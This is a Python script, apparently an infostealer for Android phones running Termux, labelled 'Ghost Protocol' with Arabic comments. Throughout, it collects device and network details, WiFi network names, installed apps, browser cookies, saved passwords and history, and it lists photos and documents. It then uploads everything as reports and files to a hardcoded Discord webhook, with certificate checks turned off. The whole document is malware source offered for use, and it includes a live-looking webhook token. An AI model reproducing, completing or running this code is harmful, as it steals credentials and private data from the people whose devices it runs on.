#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            GHOST PROTOCOL - TERMUX EDITION              ║
# ║        FULL WINDOWS POWER ON ANDROID                    ║
# ╚══════════════════════════════════════════════════════════╝

# ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
import sqlite3
import hashlib
import base64
import re
from datetime import datetime
import zipfile
import io
import threading

# ════════ ANDROID PATHS INSTEAD OF WINDOWS ════════
LOCAL = "/data/data/com.termux/files/home"
ROAMING = "/data/data/com.termux/files/home"
ANDROID_PATHS = {
    'Chrome': '/data/data/com.android.chrome/app_chrome/Default',
    'Firefox': '/data/data/org.mozilla.firefox/files/mozilla',
    'Opera': '/data/data/com.opera.browser/app_opera',
    'Edge': '/data/data/com.microsoft.emmx/files',
    'Brave': '/data/data/com.brave.browser/files',
    'Samsung': '/data/data/com.sec.android.app.sbrowser',
    'UC': '/data/data/com.UCMobile/files'
}

# ════════ ANDROID-SPECIFIC CRYPTO (بديل win32crypt) ════════
class AndroidCrypto:
    """بديل لـ win32crypt للـ Android"""
    
    @staticmethod
    def decrypt_chrome_value(encrypted_value, key=None):
        """محاكاة لـ CryptUnprotectData ولكن لـ Android"""
        try:
            # Chrome على Android يستخدم AES-GCM
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                # تخطي header (v10 أو v11)
                encrypted_value = encrypted_value[3:]
                
                # استخراج iv (12 bytes)
                iv = encrypted_value[:12]
                ciphertext = encrypted_value[12:-16]
                tag = encrypted_value[-16:]
                
                # إذا عندنا key (من Local State)
                if key:
                    from Crypto.Cipher import AES
                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                    return decrypted.decode('utf-8', errors='ignore')
            
            return "DECRYPTION_FAILED"
        except:
            return "ENCRYPTED_VALUE"
    
    @staticmethod
    def extract_chrome_key():
        """استخراج Chrome encryption key من Android"""
        try:
            # مسارات ممكنة للـ Local State
            possible_paths = [
                '/data/data/com.android.chrome/app_chrome/Local State',
                '/data/data/com.android.chrome/files/Local State',
                '/data/user/0/com.android.chrome/app_chrome/Local State'
            ]
            
            for path in possible_paths:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        local_state = json.load(f)
                        encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
                        
                        if encrypted_key:
                            # قاعدة64 decode
                            encrypted_key = base64.b64decode(encrypted_key)
                            # إزالة prefix 'DPAPI' (5 bytes)
                            encrypted_key = encrypted_key[5:]
                            return encrypted_key
        except:
            pass
        return None

# ════════ ANDROID-SPECIFIC FUNCTIONS ════════
def get_android_system_info():
    """بديل لـ Windows system info"""
    info = {
        'device_id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
        'device_name': socket.gethostname(),
        'username': getpass.getuser(),
        'platform': platform.platform(),
        'android_version': get_android_version(),
        'is_rooted': check_root(),
        'storage': get_android_storage(),
        'network': get_android_network(),
        'installed_apps': get_installed_apps(),
        'processes': get_running_processes()
    }
    return info

def get_android_version():
    """الحصول على إصدار Android"""
    try:
        if os.path.exists('/system/build.prop'):
            with open('/system/build.prop', 'r') as f:
                content = f.read()
                for line in content.split('\n'):
                    if 'ro.build.version.release' in line:
                        return line.split('=')[1].strip()
    except:
        pass
    return "Unknown"

def check_root():
    """التحقق إذا الجهاز rooted"""
    root_indicators = [
        '/system/xbin/su',
        '/system/bin/su',
        '/sbin/su',
        '/data/local/bin/su',
        '/data/local/xbin/su'
    ]
    return any(os.path.exists(path) for path in root_indicators)

def get_android_storage():
    """معلومات التخزين في Android"""
    storage_info = {}
    
    storage_paths = [
        ('/', 'Root'),
        ('/sdcard', 'External Storage'),
        ('/storage/emulated/0', 'Internal Storage'),
        ('/data/data/com.termux/files/home', 'Termux Home')
    ]
    
    import shutil
    for path, name in storage_paths:
        if os.path.exists(path):
            try:
                usage = shutil.disk_usage(path)
                storage_info[name] = {
                    'total_gb': usage.total // (1024**3),
                    'free_gb': usage.free // (1024**3),
                    'used_gb': usage.used // (1024**3)
                }
            except:
                pass
    
    return storage_info

def get_android_network():
    """معلومات الشبكة في Android"""
    network_info = {}
    
    # IP العام
    try:
        network_info['public_ip'] = urllib.request.urlopen("https://api.ipify.org").read().decode()
    except:
        network_info['public_ip'] = "Unknown"
    
    # معلومات WiFi
    network_info['wifi'] = get_wifi_info_android()
    
    return network_info

def get_wifi_info_android():
    """الحصول على معلومات WiFi في Android"""
    wifi_info = []
    
    # محاولة قراءة ملفات WiFi
    wifi_files = [
        '/data/misc/wifi/wpa_supplicant.conf',
        '/data/misc/wifi/WifiConfigStore.xml'
    ]
    
    for wifi_file in wifi_files:
        if os.path.exists(wifi_file):
            try:
                with open(wifi_file, 'r', errors='ignore') as f:
                    content = f.read()
                    # استخراج SSIDs
                    ssids = re.findall(r'ssid="([^"]+)"', content)
                    wifi_info.extend(ssids)
            except:
                pass
    
    return list(set(wifi_info))[:10]  # أول 10 شبكات

def get_installed_apps():
    """الحصول على التطبيقات المثبتة"""
    apps = []
    
    # حزم Termux
    try:
        result = subprocess.run("apt list --installed 2>/dev/null | head -30", 
                              shell=True, capture_output=True, text=True)
        if result.stdout:
            packages = result.stdout.strip().split('\n')[1:]
            apps.extend(packages[:20])
    except:
        pass
    
    # أدوات Android (إذا rooted)
    if check_root():
        try:
            result = subprocess.run("pm list packages 2>/dev/null | head -30", 
                                  shell=True, capture_output=True, text=True)
            if result.stdout:
                android_apps = result.stdout.strip().split('\n')
                apps.extend([pkg.replace('package:', '') for pkg in android_apps[:20]])
        except:
            pass
    
    return apps

def get_running_processes():
    """الحصول على العمليات النشطة"""
    processes = []
    try:
        result = subprocess.run("ps aux 2>/dev/null | head -20", 
                              shell=True, capture_output=True, text=True)
        if result.stdout:
            processes = result.stdout.strip().split('\n')
    except:
        pass
    return processes

# ════════ BROWSER DATA EXTRACTION FOR ANDROID ════════
def extract_android_browser_data():
    """استخراج بيانات المتصفحات في Android"""
    all_browser_data = {
        'cookies': [],
        'passwords': [],
        'history': [],
        'bookmarks': []
    }
    
    for browser_name, browser_path in ANDROID_PATHS.items():
        if os.path.exists(browser_path):
            browser_data = extract_single_browser(browser_name, browser_path)
            
            all_browser_data['cookies'].extend(browser_data.get('cookies', []))
            all_browser_data['passwords'].extend(browser_data.get('passwords', []))
            all_browser_data['history'].extend(browser_data.get('history', []))
            all_browser_data['bookmarks'].extend(browser_data.get('bookmarks', []))
    
    return all_browser_data

def extract_single_browser(browser_name, browser_path):
    """استخراج بيانات متصفح واحد"""
    browser_data = {
        'cookies': [],
        'passwords': [],
        'history': [],
        'bookmarks': []
    }
    
    try:
        # البحث عن ملفات SQLite
        for root, dirs, files in os.walk(browser_path):
            for file in files:
                if file.endswith('.db') or file.endswith('.sqlite'):
                    db_path = os.path.join(root, file)
                    
                    # تحديد نوع الداتابيس
                    if 'cookie' in file.lower():
                        cookies = extract_cookies_from_db(browser_name, db_path)
                        browser_data['cookies'].extend(cookies)
                    
                    elif 'web data' in file.lower() or 'login' in file.lower():
                        passwords = extract_passwords_from_db(browser_name, db_path)
                        browser_data['passwords'].extend(passwords)
                    
                    elif 'history' in file.lower():
                        history = extract_history_from_db(browser_name, db_path)
                        browser_data['history'].extend(history)
                    
                    elif 'bookmark' in file.lower():
                        bookmarks = extract_bookmarks_from_db(browser_name, db_path)
                        browser_data['bookmarks'].extend(bookmarks)
    except:
        pass
    
    return browser_data

def extract_cookies_from_db(browser_name, db_path):
    """استخراج الكوكيز من الداتابيس"""
    cookies = []
    
    try:
        temp_db = f"/data/data/com.termux/files/home/tmp_{int(time.time())}.db"
        subprocess.run(f"cp '{db_path}' '{temp_db}'", shell=True)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # محاولة جداول مختلفة
        tables = ['cookies', 'moz_cookies', 'android_metadata']
        
        for table in tables:
            try:
                cursor.execute(f"SELECT host_key, name, encrypted_value FROM {table} LIMIT 20")
                rows = cursor.fetchall()
                
                for host, name, encrypted in rows:
                    if host and name:
                        # محاولة فك التشفير
                        decrypted = AndroidCrypto.decrypt_chrome_value(encrypted)
                        cookies.append(f"[{browser_name}] {host} | {name} = {decrypted[:50]}")
            except:
                continue
        
        conn.close()
        os.remove(temp_db)
    except:
        pass
    
    return cookies

def extract_passwords_from_db(browser_name, db_path):
    """استخراج الباسوردات من الداتابيس"""
    passwords = []
    
    try:
        temp_db = f"/data/data/com.termux/files/home/tmp_pass_{int(time.time())}.db"
        subprocess.run(f"cp '{db_path}' '{temp_db}'", shell=True)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # محاولة جداول logins
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
            rows = cursor.fetchall()
            
            for url, username, encrypted in rows:
                if url and username:
                    decrypted = AndroidCrypto.decrypt_chrome_value(encrypted)
                    passwords.append(f"[{browser_name}] {url} | {username} = {decrypted[:30]}")
        except:
            pass
        
        conn.close()
        os.remove(temp_db)
    except:
        pass
    
    return passwords

def extract_history_from_db(browser_name, db_path):
    """استخراج التاريخ من الداتابيس"""
    history = []
    
    try:
        temp_db = f"/data/data/com.termux/files/home/tmp_hist_{int(time.time())}.db"
        subprocess.run(f"cp '{db_path}' '{temp_db}'", shell=True)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
            rows = cursor.fetchall()
            
            for url, title, timestamp in rows:
                if url and title:
                    history.append(f"[{browser_name}] {title[:50]} - {url[:80]}")
        except:
            pass
        
        conn.close()
        os.remove(temp_db)
    except:
        pass
    
    return history

# ════════ MEDIA AND FILE EXTRACTION ════════
def extract_android_media():
    """استخراج الوسائط من Android"""
    media_data = {
        'photos': [],
        'videos': [],
        'documents': [],
        'screenshots': []
    }
    
    # مسارات الوسائط في Android
    media_paths = [
        '/sdcard/DCIM/Camera',
        '/sdcard/DCIM/Screenshots',
        '/sdcard/Pictures',
        '/sdcard/Download',
        '/sdcard/Movies',
        '/storage/emulated/0/DCIM/Camera'
    ]
    
    for media_path in media_paths:
        if os.path.exists(media_path):
            try:
                files = os.listdir(media_path)[:10]  # أول 10 ملفات فقط
                
                for file in files:
                    file_lower = file.lower()
                    file_path = os.path.join(media_path, file)
                    
                    if file_lower.endswith(('.jpg', '.jpeg', '.png', '.gif')):
                        media_data['photos'].append(file_path)
                    
                    elif file_lower.endswith(('.mp4', '.avi', '.mov', '.mkv')):
                        media_data['videos'].append(file_path)
                    
                    elif file_lower.endswith(('.pdf', '.doc', '.docx', '.xls', '.txt')):
                        media_data['documents'].append(file_path)
                    
                    elif 'screenshot' in file_lower:
                        media_data['screenshots'].append(file_path)
            except:
                pass
    
    return media_data

# ════════ DISCORD-STYLE REPORTING ════════
def send_android_report():
    """إرسال تقرير Android كامل"""
    
    # جمع كل البيانات
    system_info = get_android_system_info()
    browser_data = extract_android_browser_data()
    media_data = extract_android_media()
    
    # إنشاء تقرير
    report = f"""
╔══════════════════════════════════════════════════════════╗
║                GHOST PROTOCOL - ANDROID EDITION         ║
║                M1 EZ HAING NOW  PH                       ║
╚══════════════════════════════════════════════════════════╝

📱 **ANDROID SYSTEM INTELLIGENCE:**
  Device ID: {system_info['device_id']}
  Device: {system_info['device_name']}
  User: {system_info['username']}
  Android: {system_info['android_version']}
  Rooted: {'✅ YES' if system_info['is_rooted'] else '❌ NO'}
  Public IP: {system_info['network']['public_ip']}
  Storage: {len(system_info['storage'])} partitions
  Apps: {len(system_info['installed_apps'])} installed
  Processes: {len(system_info['processes'])} running

🌐 **BROWSER DATA HARVEST:**
  Cookies: {len(browser_data['cookies'])} found
  Passwords: {len(browser_data['passwords'])} found
  History: {len(browser_data['history'])} entries
  Bookmarks: {len(browser_data['bookmarks'])} saved

📸 **MEDIA FILES DISCOVERED:**
  Photos: {len(media_data['photos'])} images
  Videos: {len(media_data['videos'])} videos
  Documents: {len(media_data['documents'])} files
  Screenshots: {len(media_data['screenshots'])} captures

📶 **WIFI NETWORKS:**
  {', '.join(system_info['network']['wifi'][:5]) if system_info['network']['wifi'] else 'No WiFi data'}

⚡ **TERMUX ENVIRONMENT:**
  Platform: {system_info['platform']}
  Home: {LOCAL}
  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔥 **GHOST PROTOCOL STATUS: ACTIVE**
🎯 **OPERATOR: M1 EZ HAING NOW PH**
✅ **ANDROID PENETRATION: SUCCESSFUL**
"""
    
    # إرسال لـ Discord
    send_to_discord(report)
    
    # إرسال ملفات إذا وجدت
    send_detailed_files(browser_data, media_data, system_info)

def send_to_discord(content):
    """إرسال محتوى لـ Discord"""
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
        
        payload = {
            "content": content,
            "username": "Android Ghost Protocol",
            "avatar_url": "https://i.imgur.com/7QqQjqG.png"
        }
        
        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Android Ghost)'
        }
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        if response.status in [200, 204]:
            print(f"[✅] Report sent! Status: {response.status}")
            return True
        else:
            print(f"[❌] Failed: {response.status}")
            return False
            
    except Exception as e:
        print(f"[❌] Error sending: {str(e)[:50]}")
        return False

def send_detailed_files(browser_data, media_data, system_info):
    """إرسال ملفات مفصلة"""
    
    # 1. إرسال ملف بكوكيز البصفحات
    if browser_data['cookies']:
        cookies_file = create_temp_file("cookies.txt", browser_data['cookies'])
        send_file_to_discord(cookies_file, "🍪 **ANDROID BROWSER COOKIES**")
    
    # 2. إرسال ملف بالباسوردات
    if browser_data['passwords']:
        passwords_file = create_temp_file("passwords.txt", browser_data['passwords'])
        send_file_to_discord(passwords_file, "🔑 **ANDROID BROWSER PASSWORDS**")
    
    # 3. إرسال ملف بالتاريخ
    if browser_data['history']:
        history_file = create_temp_file("history.txt", browser_data['history'])
        send_file_to_discord(history_file, "📜 **ANDROID BROWSER HISTORY**")
    
    # 4. إرسال ملف بالوسائط
    media_report = []
    media_report.append("📸 MEDIA FILES FOUND:")
    
    for category, files in media_data.items():
        if files:
            media_report.append(f"\n{category.upper()}:")
            for i, file in enumerate(files[:5], 1):
                media_report.append(f"{i}. {file}")
    
    if media_report:
        media_file = create_temp_file("media.txt", media_report)
        send_file_to_discord(media_file, "📁 **ANDROID MEDIA FILES**")
    
    # 5. إرسال ملف بالمعلومات
    system_report = []
    system_report.append("📱 SYSTEM INFORMATION:")
    
    for key, value in system_info.items():
        if key not in ['processes', 'installed_apps', 'network', 'storage']:
            system_report.append(f"{key}: {value}")
    
    system_file = create_temp_file("system.txt", system_report)
    send_file_to_discord(system_file, "🖥️ **ANDROID SYSTEM INFO**")

def create_temp_file(filename, content_list):
    """إنشاء ملف مؤقت"""
    temp_path = f"/data/data/com.termux/files/home/{filename}"
    
    with open(temp_path, 'w', encoding='utf-8') as f:
        if isinstance(content_list, list):
            for item in content_list:
                f.write(f"{item}\n")
        else:
            f.write(str(content_list))
    
    return temp_path

def send_file_to_discord(file_path, caption):
    """إرسال ملف لـ Discord"""
    try:
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, 'rb') as f:
                file_content = f.read()
            
            # Discord requires multipart form
            boundary = '----AndroidBoundary' + hashlib.md5(str(time.time()).encode()).hexdigest()
            
            body = []
            body.append(f'--{boundary}')
            body.append(f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"')
            body.append(f'Content-Type: text/plain')
            body.append('')
            body = '\r\n'.join(body).encode() + file_content + f'\r\n--{boundary}--\r\n'.encode()
            
            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0'
            }
            
            req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers)
            urllib.request.urlopen(req, timeout=20)
            
            print(f"[✅] File sent: {os.path.basename(file_path)}")
            
            # تنظيف
            os.remove(file_path)
            
    except Exception as e:
        print(f"[❌] Failed to send file: {str(e)[:50]}")

# ════════ MAIN EXECUTION ════════
def main():
    """الدالة الرئيسية"""
    print("\n" + "🔥"*70)
    print("🔥 GHOST PROTOCOL - ANDROID TERMUX EDITION")
    print("🔥 Converted from Windows with full power")
    print("🔥"*70)
    
    print("\n[1] Checking Android environment...")
    
    # التحقق من أننا في Termux
    if not os.path.exists('/data/data/com.termux'):
        print("[❌] Not running in Termux!")
        return
    
    print("[✅] Running in Termux Android")
    
    # التحقق من الصلاحيات
    print("[2] Checking permissions...")
    
    if not os.path.exists('/sdcard'):
        print("[❌] No SDCard access - grant storage permission!")
        print("[ℹ️] Run: termux-setup-storage")
        return
    
    print("[✅] Storage permission granted")
    
    # التحقق من الإنترنت
    print("[3] Checking internet connection...")
    try:
        urllib.request.urlopen("http://google.com", timeout=5)
        print("[✅] Internet connection active")
    except:
        print("[❌] No internet connection!")
        return
    
    # بدء عملية الحصاد
    print("\n[4] Starting Android Ghost Protocol...")
    
    try:
        send_android_report()
        print("\n" + "✅"*70)
        print("✅ GHOST PROTOCOL COMPLETED SUCCESSFULLY")
        print("✅ Check your Discord for Android intelligence")
        print("✅"*70)
        
    except Exception as e:
        print(f"[❌] Error: {str(e)}")
        import traceback
        traceback.print_exc()

# ════════ QUICK TEST ════════
def quick_test():
    """اختبار سريع"""
    print("\n" + "🔧"*35)
    print("QUICK TEST MODE")
    print("🔧"*35)
    
    print("\n[1] Testing Discord webhook...")
    try:
        test_msg = {"content": "🔥 GHOST PROTOCOL ANDROID TEST\nTime: " + datetime.now().strftime("%H:%M:%S")}
        data = json.dumps(test_msg).encode()
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=10)
        
        print(f"[✅] Webhook test passed! Status: {response.status}")
        
    except Exception as e:
        print(f"[❌] Webhook test failed: {str(e)[:100]}")
    
    print("\n[2] Testing Android system info...")
    sys_info = get_android_system_info()
    print(f"[✅] System info collected")
    print(f"    Device: {sys_info['device_name']}")
    print(f"    Android: {sys_info['android_version']}")
    print(f"    IP: {sys_info['network']['public_ip']}")

# ════════ RUN SCRIPT ════════
if __name__ == "__main__":
    # Handle arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "test":
            quick_test()
        elif sys.argv[1] == "help":
            print("""
Usage:
  python3 ghost_android.py        # Run full Android harvest
  python3 ghost_android.py test   # Quick test mode
  python3 ghost_android.py help   # This message

Features:
  • Android system intelligence
  • Browser data extraction
  • Media file discovery
  • WiFi network info
  • Termux environment analysis
            """)
        else:
            main()
    else:
        # Run full version by default
        main()
